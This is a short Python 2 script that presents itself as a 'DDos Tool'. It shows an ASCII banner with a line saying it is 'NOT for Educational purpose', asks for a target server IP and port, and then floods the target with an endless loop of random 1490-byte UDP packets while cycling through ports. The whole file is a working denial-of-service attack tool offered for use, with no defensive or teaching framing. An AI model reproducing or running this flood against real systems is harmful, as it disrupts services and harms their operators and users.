import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


cmd=("clear")
os.system(cmd)

print("\33[37m ____  ____                 _   _   _             _  \33[0m")
print("\33[37m|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __ \33[0m")
print("\33[37m| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ / \33[0m")
print("\33[37m| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <   \33[0m")
print("\33[37m|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\ \33[0m")
print("")
print("    \33[32m .:. DDos Tool Coded By The-Albatros .:. \33[0m")
print("")
print("\33[41m :: REMEMBER : This Tool is NOT for Educational purpose ::\33[0m")
print("")
ip = raw_input("\33[31m[\33[0m""\33[33m*\33[0m""\33[31m]\33[0m""\33[37m Enter The Target Server IP:\33[0m ")
port = input("\33[31m[\33[0m""\33[33m*\33[0m""\33[31m]\33[0m""\33[37m Enter The Port:\33[0m ")

os.system("clear")
cmd=("\33[31m Starting Attack!\33[0m")
os.system(cmd)
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sending %s Packet  To  %s throught port:%s " %(sent,ip,port)
     if port == 65534:
       port = 1

